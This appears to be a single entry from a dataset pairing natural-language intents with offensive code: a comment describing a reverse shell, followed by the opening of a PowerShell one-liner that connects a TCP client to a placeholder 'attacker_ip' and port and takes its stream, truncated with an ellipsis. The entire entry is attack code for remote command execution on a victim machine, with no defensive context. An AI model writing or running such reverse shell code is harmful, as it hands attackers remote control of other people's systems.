# Natural language intent:
# Creating Reverse Shell, Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command execution.

$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535...
